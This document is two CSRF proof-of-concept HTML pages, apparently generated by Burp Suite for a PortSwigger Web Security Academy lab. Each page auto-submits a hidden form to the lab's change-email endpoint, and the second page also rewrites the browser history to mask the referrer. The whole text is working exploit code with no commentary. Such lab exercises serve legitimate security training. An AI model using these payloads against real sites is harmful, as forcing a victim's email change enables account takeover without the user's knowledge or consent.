1.
<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite plugin -->
<body>
	<form method="POST" action="https://0af000cf03b1a6d580ac17f5008e0091.web-security-academy.net:443/my-account/change-email" >
		<input type="text" name="email" value="ussdfer%40user.com">
		<input type="submit" value="Send">
	</form>
	<script>
		 document.forms[0].submit();
	</script>
</body>
</html>

2.
<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite plugin -->
<body>
	<script>
    history.pushState('', '', '/')
</script>
<form action="https://0af000cf03b1a6d580ac17f5008e0091.web-security-academy.net:443/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
